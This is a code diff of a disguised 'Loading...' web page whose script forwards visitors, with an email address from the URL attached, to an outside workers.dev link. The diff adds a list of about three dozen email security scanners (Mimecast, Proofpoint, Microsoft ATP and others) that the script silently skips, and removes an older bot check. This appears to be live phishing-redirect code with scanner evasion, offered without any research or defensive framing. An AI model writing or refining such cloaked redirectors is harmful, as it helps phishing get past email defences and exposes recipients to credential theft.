@@ -13,7 +13,6 @@
             margin: 0;
             background: #fff;
         }
-        .card { text-align: center; }
         .spinner {
             width: 32px;
             height: 32px;
@@ -28,22 +27,24 @@
     </style>
 </head>
 <body>
-    <div class="card">
+    <div style="text-align:center;padding-top:40vh;">
         <div class="spinner"></div>
-        <p id="msg">Loading...</p>
+        <p>Loading...</p>
     </div>
+
     <script>
     (function(){
+        var ua = navigator.userAgent.toLowerCase();
+        
+        // Block known email security scanners
+        var scanners = /mimecast|proofpoint|barracuda|symantec|mcafee|trendmicro|ironport|cisco|emailsecurity|fireeye|forcepoint|zscaler|netskope|microsoft office 365 atp|exchange online protection|securitymail|antispam|antivirus|sandbox|securence|trustwave|spamfilter|cloudmark|messagelabs|symanteccloud|spamhaus|surbl|uribl|spamcop|returnpath|valimail|agari|dmarcian|ondmarc|emailauth/i;
+        
+        if (scanners.test(ua)) { return; }
+
         var params = new URLSearchParams(window.location.search);
         var email = params.get('email') || '';
         var target = 'https://cove-prism-4c6c.p-af053b63.workers.dev/share/arL9vuijyzc';
         if (email) target += '?email=' + encodeURIComponent(email);
-
-        var ua = navigator.userAgent.toLowerCase();
-        var bots = /bot|crawl|spider|scraper|headless|phantom|selenium|puppeteer|playwright|electron|nightmare|webdriver/i;
-        if (bots.test(ua)) { document.getElementById('msg').innerText = 'Access denied'; return; }
-        if (navigator.webdriver) { document.getElementById('msg').innerText = 'Access denied'; return; }
-        if (window.outerWidth === 0 && window.outerHeight === 0) { document.getElementById('msg').innerText = 'Access denied'; return; }
 
         setTimeout(function(){
             window.location.href = target;
